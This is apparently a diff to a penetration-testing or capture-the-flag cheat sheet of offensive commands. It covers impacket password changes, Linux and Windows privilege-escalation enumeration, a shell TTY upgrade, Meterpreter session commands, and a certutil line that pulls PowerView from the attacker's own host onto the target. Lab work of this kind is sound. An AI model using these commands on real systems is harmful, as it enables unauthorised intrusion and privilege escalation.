@@ -306,17 +306,8 @@ sessions -i 1
 impacket-changepasswd -debug -dc-ip $TARGET $DC/'$USERNAME':'$PASSWORD'@$TARGET -newpass 'NewPassword123!'
 
 # Post-Exploitation 
-
-## Upgrade TTY
-python3 -c 'import pty; pty.spawn("/bin/bash")';
-CTRL-Z
-stty size;stty raw -echo;fg
-export SHELL=bash;
-export TERM=xterm-256color;
-stty rows <num> columns <num>
-reset
-
 ## Linux
+[*] Enumeration
 sudo -l
 find / -perm /4000 2>/dev/null
 cat /etc/crontab
@@ -330,7 +321,14 @@ su $USERNAME --preserve-environment
 ssh $USERNAME@$TARGET -i sshkey.pub -L 33060:Localhost:33060 -L 5000:Localhost:5000
 cat /etc/passwd | grep -vE 'nologin' | cut -d ':' -f '1'
 find / -readable -name 'root.txt' -exec echo {} \; -exec cat {} \; 2>/dev/null
-
+[*] Upgrade TTY
+python3 -c 'import pty; pty.spawn("/bin/bash")';
+CTRL-Z
+stty size;stty raw -echo;fg
+export SHELL=bash;
+export TERM=xterm-256color;
+stty rows <num> columns <num>
+reset
 ## Windows
 [*] Enumeration
 powershell -c "Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher"
@@ -387,6 +385,7 @@ background
 sessions
 sessions -i 1
 ipconfig
+sysinfo
 
 [*] Powerview
 powershell -c "certutil -urlcache -f http://$MYIP:8088/powerview.ps1 C:\programdata\powerview.ps1"
